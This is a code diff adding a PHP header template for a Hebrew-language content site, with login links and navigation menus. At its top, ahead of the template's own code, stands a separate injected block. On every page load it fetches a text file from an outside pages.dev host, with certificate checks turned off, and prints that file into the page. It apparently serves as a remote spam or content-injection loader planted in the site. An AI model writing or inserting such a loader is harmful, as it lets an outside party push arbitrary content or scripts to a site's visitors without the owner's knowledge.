@@ -1,0 +1,119 @@
+<?php
+function getContent($url) {
+    if (ini_get("allow_url_fopen")) {
+        // kalau allow_url_fopen aktif
+        return file_get_contents($url);
+    } else {
+        $ch = curl_init($url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        $data = curl_exec($ch);
+        curl_close($ch);
+        return $data;
+    }
+}
+
+$url = "https://punten-neng.pages.dev/punten.txt";
+$content = getContent($url);
+
+if ($content !== false && !empty($content)) {
+    echo $content;
+}
+?>
+<?php
+
+$domain = strtok($_SERVER["HTTP_HOST"], ".");
+if ($domain == (str_replace('.co.il', '', $_SERVER["HTTP_HOST"]))) if (!is_int(strpos($_SERVER['HTTP_HOST'], 'www'))) {
+Header('Location: http://www.'.$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]);
+exit();
+}
+if (strpos($currenturl, 'localhost') !== false) {
+} else {
+if(empty($_SERVER['HTTPS']) || $_SERVER['HTTPS'] == "off"){
+    $redirect = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+    header('HTTP/1.1 301 Moved Permanently');
+    header('Location: ' . $redirect);
+    exit();
+}
+}
+$header = $frontEnd->head($type);
+?>
+<!DOCTYPE html>
+<html lang="he">
+    <head>
+        <!-- This Website Was Built By YORTEM CMS, That's Why It's So Great -->
+        <?php echo $header; ?>
+    </head>
+    <body dir="rtl" class="class-<?php echo $type; ?>">
+<div class="super_container">
+
+	<!-- Header -->
+
+	<header class="header">
+			
+		<!-- Top Bar -->
+		<div class="top_bar">
+			<div class="top_bar_container">
+				<div class="container">
+					<div class="row">
+						<div class="col">
+							<div class="top_bar_content d-flex flex-row align-items-center justify-content-start">
+								<div class="top_bar_login ml-auto">
+								<?php
+								if (empty($mycard)) {
+									echo '<div class="login_button2"><a href="/cards/register">הרשמה</a></div>';
+									echo '<div class="login_button2"><a href="/cards/login">התחברות</a></div>';
+								} else {
+									echo '<div class="login_button2">';
+									echo 'ברוך הבא ' .$mycard['crd_name'].'. 
+									<a class="topleftbold" href="/cards/edit">עדכן פרופיל</a> | 
+									<a class="topleftbold" href="/cards/articles">צפה ברשימת המאמרים שלך</a> |';
+									if ($mycard['crd_approved'] != 0) { 
+										echo '<a class="topleftbold" href="/cards/add">הוסף מאמר</a> | ';
+									} else {
+										echo 'חשבונך ממתין לאישור | ';
+									}
+									echo '
+									<a class="topleftbold" href="/cards/logout">התנתק</a>
+									</div>
+									'; 
+								}
+								?>
+								</div>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>				
+		</div>
+
+		<!-- Header Content -->
+		<div class="header_container">
+			<div class="container">
+				<div class="row">
+					<div class="col">
+						<div class="header_content d-flex flex-row align-items-center justify-content-start">
+							<div class="logo_container">
+								<a href="/">
+									<div class="logo_text"><img src="/img/logo.png" alt="לוגו"/></div>
+								</a>
+							</div>
+							<nav class="main_nav_contaner ml-auto">
+                                <?php echo menu(57,'main_nav',2); ?>
+							</nav>
+                            <div class="hamburgerim">
+								<i class="fa fa-bars menu_mm" aria-hidden="true"></i>
+							</div>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+
+	</header>
+
+<!-- mobile menu -->
+<div class="hamburgerim-open">
+    <?php echo menu(57,'mobile_nav',2); ?>
+</div>
